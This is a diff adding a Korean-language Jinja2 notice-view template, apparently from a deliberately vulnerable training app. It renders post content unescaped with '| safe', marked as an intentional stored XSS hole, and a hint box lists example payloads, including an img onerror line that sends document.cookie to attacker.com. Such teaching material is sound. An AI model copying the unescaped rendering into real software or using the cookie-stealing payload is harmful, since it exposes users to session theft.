@@ -1,0 +1,55 @@
+{% extends 'base.html' %}
+
+{% block title %}공지사항 - {{ notice['title'] if notice else '없음' }}{% endblock %}
+
+{% block content %}
+<div class="page-container">
+    <div class="page-header">
+        <a href="{{ url_for('notices') }}" class="back-link">
+            <i class="fas fa-arrow-left"></i> 목록으로
+        </a>
+    </div>
+    
+    {% if notice %}
+        <div class="content-card notice-view">
+            <div class="notice-header">
+                <h1>{{ notice['title'] }}</h1>
+                <div class="notice-meta">
+                    <span><i class="fas fa-user"></i> 작성자 ID: {{ notice['author_id'] }}</span>
+                    <span><i class="fas fa-clock"></i> {{ notice['created_at'] }}</span>
+                </div>
+            </div>
+            <div class="notice-content">
+                <!-- 취약점: Stored XSS - content가 이스케이프 없이 출력됨 -->
+                {{ notice['content'] | safe }}
+            </div>
+        </div>
+        
+        <!-- Stored XSS 힌트 -->
+        <div class="hint-box" style="margin-top: 20px; padding: 15px; background: #f8d7da; border-radius: 8px; font-size: 12px;">
+            <p><strong>⚠️ Stored XSS 취약점:</strong></p>
+            <p>공지사항 작성 시 HTML/JavaScript가 필터링 없이 저장됩니다.</p>
+            <p>예시 페이로드:</p>
+            <ul style="margin-left: 20px;">
+                <li><code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code></li>
+                <li><code>&lt;img src=x onerror="fetch('http://attacker.com?c='+document.cookie)"&gt;</code></li>
+            </ul>
+        </div>
+    {% else %}
+        <div class="alert alert-danger">
+            <i class="fas fa-exclamation-circle"></i>
+            공지사항을 찾을 수 없습니다.
+        </div>
+    {% endif %}
+</div>
+{% endblock %}
+
+
+
+
+
+
+
+
+
+
